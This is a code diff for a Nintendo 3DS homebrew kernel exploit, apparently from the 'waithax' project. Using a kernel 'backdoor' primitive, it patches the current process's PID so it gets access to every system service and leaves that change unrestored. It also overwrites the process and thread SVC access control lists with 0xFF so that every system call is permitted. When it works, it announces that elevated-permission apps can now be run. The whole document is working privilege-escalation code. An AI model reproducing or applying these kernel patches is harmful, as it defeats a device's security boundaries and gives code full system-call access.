@@ -1,18 +1,27 @@
 #include <3ds.h>
 #include <stdio.h>
+#include <string.h>
 #include "waithax.h"
 
 
 // Shamelessly copied from
 // https://github.com/Steveice10/memchunkhax2/blob/master/source/memchunkhax2.c#L16
 
-#define OLDNEW(x) 	     		(g_is_new3ds ? x ## _NEW : x ## _OLD)
+#define OLDNEW(x)                    (g_is_new3ds ? x ## _NEW : x ## _OLD)
 
-#define CURRENT_KTHREAD	 		(*((u8**)0xFFFF9000))
-#define CURRENT_KPROCESS 		(*((u8**)0xFFFF9004))
+#define CURRENT_KTHREAD              (*((u8**)0xFFFF9000))
+#define CURRENT_KPROCESS             (*((u8**)0xFFFF9004))
 
-#define KPROCESS_PID_OFFSET_OLD (0xB4)
-#define KPROCESS_PID_OFFSET_NEW (0xBC)
+#define SVC_ACL_SIZE                 (0x10)
+
+#define KPROCESS_ACL_START_OLD       (0x88)
+#define KPROCESS_ACL_START_NEW       (0x90)
+
+#define KPROCESS_PID_OFFSET_OLD      (0xB4)
+#define KPROCESS_PID_OFFSET_NEW      (0xBC)
+
+#define KTHREAD_THREADPAGEPTR_OFFSET (0x8C)
+#define KSVCTHREADAREA_BEGIN_OFFSET  (0xC8)
 
 
 static bool g_is_new3ds = 0;
@@ -42,6 +51,45 @@ static void K_RestorePID(void)
 
 	// Restore the original PID
 	*pidPtr = g_original_pid;
+}
+
+static void K_PatchACL(void)
+{
+	// Patch the process first (for newly created threads).
+	u8 *proc = CURRENT_KPROCESS;
+	u8 *procacl = proc + OLDNEW(KPROCESS_ACL_START);
+	memset(procacl, 0xFF, SVC_ACL_SIZE);
+
+	// Now patch the current thread.
+	u8 *thread = CURRENT_KTHREAD;
+	u8 *thread_pageend = *(u8**)(thread + KTHREAD_THREADPAGEPTR_OFFSET);
+	u8 *thread_page = thread_pageend - KSVCTHREADAREA_BEGIN_OFFSET;
+	memset(thread_page, 0xFF, SVC_ACL_SIZE);
+}
+
+
+void initsrv_allservices(void)
+{
+	printf("Patching PID\n");
+	waithax_backdoor(K_PatchPID);
+
+	printf("Reiniting srv:\n");
+	srvExit();
+	srvInit();
+
+	// Not restoring the PID because we want it to stay like this if the next
+	// started homebrew reinits srv or something similar.
+	// Comment this return if you want/need to restore the PID.
+	return;
+
+	printf("Restoring PID\n");
+	waithax_backdoor(K_RestorePID);
+}
+
+void patch_svcaccesstable(void)
+{
+	printf("Patching SVC access table\n");
+	waithax_backdoor(K_PatchACL);
 }
 
 int main(int argc, char **argv)
@@ -77,15 +125,8 @@ int main(int argc, char **argv)
 	if(!success)
 		goto end;
 
-	printf("Patching PID\n");
-	waithax_backdoor(K_PatchPID);
-
-	printf("Reiniting srv:\n");
-	srvExit();
-	srvInit();
-
-	printf("Restoring PID\n");
-	waithax_backdoor(K_RestorePID);
+	initsrv_allservices();
+	patch_svcaccesstable();
 
 	printf("Cleaning up\n");
 	waithax_cleanup();
@@ -95,6 +136,9 @@ int main(int argc, char **argv)
 	printf("am:u 2nd try: res=%08lx handle=%08lx\n\n", res, amHandle);
 	if(amHandle)
 		svcCloseHandle(amHandle);
+
+	if(res == 0)
+		printf("The exploit succeeded. You can now exit this and run another app needing elevated permissions.\n");
 
 end:
 	printf("Press START to exit.\n");
